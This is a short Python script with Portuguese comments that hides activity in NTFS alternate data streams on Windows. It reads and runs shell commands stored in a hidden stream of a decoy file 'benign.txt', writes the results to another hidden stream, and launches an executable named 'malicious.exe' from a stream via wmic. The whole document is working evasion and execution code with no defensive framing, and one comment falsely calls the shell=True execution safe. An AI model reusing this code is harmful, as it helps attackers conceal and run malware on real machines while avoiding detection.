import os
import subprocess

def buildADSFilename(filename, streamname):
    return filename + ":" + streamname

def execute_commands(commandfile, resultfile):
    """Executa comandos de um arquivo e redireciona os resultados."""
    try:
        with open(commandfile, "r") as c:
            for line in c:
                line = line.strip()
                if line:
                    print(f"Executing command: {line}")
                    # Usando subprocess para garantir controle e segurança
                    with open(resultfile, "a") as r:
                        subprocess.run(line, shell=True, stdout=r, stderr=subprocess.PIPE)
    except FileNotFoundError:
        print(f"Command file {commandfile} not found.")
    except Exception as e:
        print(f"Error executing commands: {e}")

def run_executable(exefile, decoy):
    """Executa um arquivo executável armazenado como fluxo alternativo de dados."""
    exepath = os.path.join(os.getcwd(), buildADSFilename(decoy, exefile))
    
    # Verifica se o arquivo existe antes de tentar executar
    if os.path.exists(exepath):
        try:
            print(f"Running executable: {exepath}")
            subprocess.run(["wmic", "process", "call", "create", exepath], check=True)
        except subprocess.CalledProcessError as e:
            print(f"Failed to run executable: {e}")
    else:
        print(f"Executable {exepath} not found.")

# Exemplo de execução com um arquivo de decoy 'benign.txt'
decoy = "benign.txt"
resultfile = buildADSFilename(decoy, "results.txt")
commandfile = buildADSFilename(decoy, "commands.txt")

# Execute comandos do arquivo
execute_commands(commandfile, resultfile)

# Executa o arquivo executável
exefile = "malicious.exe"
run_executable(exefile, decoy)
